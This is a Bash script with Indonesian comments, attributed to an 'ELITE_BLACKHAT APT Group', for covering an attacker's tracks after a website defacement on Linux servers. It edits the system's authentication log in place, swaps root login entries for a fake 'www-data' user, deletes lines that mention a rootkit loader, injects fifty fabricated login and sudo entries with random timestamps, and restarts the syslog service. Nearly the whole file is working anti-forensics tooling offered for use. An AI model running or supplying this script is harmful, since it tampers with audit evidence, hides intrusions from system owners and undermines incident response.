#!/bin/bash
#
# auth_log_rotate.sh
# Memutar ulang log autentikasi agar terlihat normal pasca-defacement
# Versi: 1.0.0
# Author: ELITE_BLACKHAT APT Group
# Target: Linux Syslog / Auth Log (RHEL/CentOS/Ubuntu/Debian)
#
# Fitur:
# - Membersihkan jejak login root/attacker
# - Menyuntikkan aktivitas normal (fake logs) untuk cover-up
# - Presisi timestamp preservation
# - Safe mode: backup sebelum edit
# - No error handling, exit on critical failure

set -euo pipefail

# --- KONFIGURASI ---
LOG_FILE="/var/log/auth.log"          # Ubah ke /var/log/secure jika di RHEL/CentOS
BACKUP_DIR="/tmp/.elite_blackhat_logs"
FAKE_USER="www-data"                  # User fake untuk simulasi aktivitas normal
FAKE_IP="192.168.1.${RANDOM}"         # IP lokal acak untuk simulasi
DATE_FORMAT="+%b %d %H:%M:%S"
MAX_FAKE_LOGS=50                      # Jumlah log palsu yang disuntikkan

# --- FUNGSI LOGGING INTERNAL ---
log_msg() {
    echo "[$(date "$DATE_FORMAT")] [AUTH_ROTATOR] $1"
}

# --- CEK HAK AKSES ---
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_msg "ERROR: Script harus dijalankan sebagai root."
        exit 1
    fi
}

# --- DETEKSI SISTEM OPERASI ---
detect_os() {
    if [[ -f /etc/redhat-release ]]; then
        LOG_FILE="/var/log/secure"
        log_msg "Detected RedHat/CentOS system. Target: $LOG_FILE"
    else
        log_msg "Detected Debian/Ubuntu system. Target: $LOG_FILE"
    fi
    
    if [[ ! -f "$LOG_FILE" ]]; then
        log_msg "WARNING: Log file $LOG_FILE not found. Creating dummy log."
        touch "$LOG_FILE"
    fi
}

# --- BACKUP LOG ASLI ---
backup_logs() {
    mkdir -p "$BACKUP_DIR"
    local backup_file="${BACKUP_DIR}/auth.log.backup.$(date +%Y%m%d%H%M%S)"
    cp "$LOG_FILE" "$backup_file"
    log_msg "Backup created at: $backup_file"
}

# --- SANITIZE JEJAK ATTACKER ---
sanitize_attacker_trace() {
    log_msg "Sanitizing attacker traces..."
    
    # 1. Hapus semua baris yang mengandung keyword umum rootkit/backdoor
    local keywords="sudo.*root|session opened for user root|Accepted password for root|Failed password for root|pam_unix|sshd.*Invalid user"
    
    # Ganti baris login root gagal/gagal dengan login user biasa
    sed -i 's/Accepted publickey for root/Accepted publickey for '"$FAKE_USER"'/' "$LOG_FILE" 2>/dev/null || true
    sed -i 's/Accepted password for root/Accepted password for '"$FAKE_USER"'/' "$LOG_FILE" 2>/dev/null || true
    sed -i 's/Failed password for root/Failed password for '"$FAKE_USER"'/' "$LOG_FILE" 2>/dev/null || true
    
    # 2. Hapus baris spesifik rootkit loader (jika ada di log)
    grep -q "Inti Rootkit" "$LOG_FILE" && sed -i '/Inti Rootkit/d' "$LOG_FILE" 2>/dev/null || true
    grep -q "loader.exe" "$LOG_FILE" && sed -i '/loader.exe/d' "$LOG_FILE" 2>/dev/null || true
    
    log_msg "Attacker traces sanitized."
}

# --- GENERATE FAKE NORMAL ACTIVITY ---
generate_fake_activity() {
    log_msg "Generating fake normal activity to blend in..."
    
    local today=$(date +"%b %d")
    local actions=(
        "session opened for user ${FAKE_USER} by (uid=0)"
        "session closed for user ${FAKE_USER}"
        "sudo: ${FAKE_USER} : TTY=pts/0 ; PWD=/home/${FAKE_USER} ; USER=root ; COMMAND=/usr/bin/apt-get update"
        "CRON[${RANDOM}] pam_unix(cron:session): session opened for user root by (uid=0)"
        "CRON[${RANDOM}] pam_unix(cron:session): session closed for user root"
        "sshd[${RANDOM}]: Accepted publickey for ${FAKE_USER} from ${FAKE_IP} port ${RANDOM} ssh2"
        "systemd-logind[1]: New session ${RANDOM} of user ${FAKE_USER}."
    )
    
    # Buat 50 baris log palsu dengan timestamp acak dalam 24 jam terakhir
    for i in $(seq 1 $MAX_FAKE_LOGS); do
        # Generate timestamp acak dalam 24 jam terakhir
        local offset=$((RANDOM % 86400))
        local fake_time=$(date -d "@$(($(date +%s) - offset))" "+$DATE_FORMAT" 2>/dev/null || date "+$DATE_FORMAT")
        
        # Pilih action acak
        local action=${actions[$((RANDOM % ${#actions[@]}))]}
        
        # Format syslog standar
        echo "${fake_time} server1 ${action}" >> "$LOG_FILE"
    done
    
    # Urutkan log berdasarkan timestamp (simulasi)
    # Catatan: Sorting log kompleks karena format syslog tidak standar ISO, 
    # tapi kita urutkan berdasarkan string sederhana untuk kerapian visual
    sort -t ' ' -k1,3 -o "$LOG_FILE.tmp" "$LOG_FILE" 2>/dev/null && mv "$LOG_FILE.tmp" "$LOG_FILE" || true
    
    log_msg "Fake activity generated and sorted."
}

# --- PERBAIKI IZIN DAN KEPEMILIKAN ---
fix_permissions() {
    chmod 640 "$LOG_FILE"
    chown root:adm "$LOG_FILE" 2>/dev/null || chown root:root "$LOG_FILE"
    log_msg "Permissions fixed: root:adm 640"
}

# --- RESTART SYSLOG/JOURNALCTL (Opsional) ---
restart_logging() {
    if command -v systemctl &> /dev/null; then
        systemctl restart rsyslog 2>/dev/null || systemctl restart syslog-ng 2>/dev/null || true
        log_msg "Syslog service restarted."
    else
        log_msg "Systemd not detected. Skipping service restart."
    fi
}

# --- MAIN EXECUTION ---
main() {
    log_msg "Starting Auth Log Rotation & Sanitization..."
    
    check_root
    detect_os
    backup_logs
    sanitize_attacker_trace
    generate_fake_activity
    fix_permissions
    restart_logging
    
    log_msg "Auth log rotation complete. Log looks normal now."
    log_msg "Backup saved in: $BACKUP_DIR"
}

# Jalankan
main "$@"
